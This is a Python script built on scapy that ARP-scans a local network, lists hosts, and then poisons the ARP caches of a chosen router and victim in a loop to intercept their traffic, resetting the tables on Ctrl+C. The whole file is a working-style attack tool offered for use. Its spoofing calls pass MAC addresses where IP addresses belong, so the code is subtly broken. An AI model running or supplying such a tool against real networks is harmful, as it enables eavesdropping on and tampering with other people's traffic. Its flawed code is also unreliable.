#/usr/bin/env python3.7
import scapy.all as scapy
import time


class Scanners:
    def __init__(self, ip, time=1):
        self.ip = ip
        self.time = time
        self.client_list = []

    def ARP_scan(self):
        arp_scaner = scapy.ARP(pdst=self.ip)  # создания своего арп запроса
        brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet = brodcast / arp_scaner
        answered = scapy.srp(arp_packet, timeout=int(self.time), verbose=False)[0]
        for element in answered:
            client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc, "Ver": str(element[1].ptype)}
            self.client_list.append(client_dict)

    def print_result(self):
        i = 0
        print("________________________________________________________________________________________")
        print("Number\t|\tIP\t\t|\tMAC address\t\t|\tVesion IP\t|")
        print("----------------------------------------------------------------------------------------")
        for element in self.client_list:
            print(str(i) + "\t|\t" + element["ip"] + "\t|\t" + element["mac"] + "\t|\t" + element["Ver"] + "\t\t|")
            print("----------------------------------------------------------------------------------------")
            i = i + 1

    def arp_packet(self, ip, mac, ip_hack):
        packet = scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_hack)
        scapy.send(packet, verbose=False)

    def restore(self, ip, mac, ip_hack, mac_hack):
        packets = scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_hack, hwsrc=mac_hack)
        scapy.send(packets, verbose=False, count=4)

    def star(self):
        self.ARP_scan()
        self.print_result()
        while True:
            a = input("[+]  ARP spoof yes/no -->")
            if "yes" in a:
                a =True
                break
            elif "no" in a:
                a = False
                break
        if a:
            b = int(input("Router MAC abd IP (number)-->"))
            c = int(input("Mashin MAC and IP (number)-->"))
            i = 0
            try:
                while True:
                    self.arp_packet(self.client_list[b]["ip"], self.client_list[b]["mac"],self.client_list[c]["mac"])
                    self.arp_packet(self.client_list[c]["ip"], self.client_list[c]["mac"], self.client_list[b]["mac"])
                    i = i+2
                    print("\r[+] Packets sent:" + str(i), end="")
                    time.sleep(2)
            except KeyboardInterrupt:
                print("\n[-] Detected CTRL + C ...... \n[+] Resetting ARP table ...... Please wait.\n[+] Quitting .....")
                self.restore(self.client_list[c]["ip"], self.client_list[c]["mac"], self.client_list[b]["ip"], self.client_list[b]["mac"])
                self.restore(self.client_list[b]["ip"], self.client_list[b]["mac"], self.client_list[c]["ip"], self.client_list[c]["mac"])
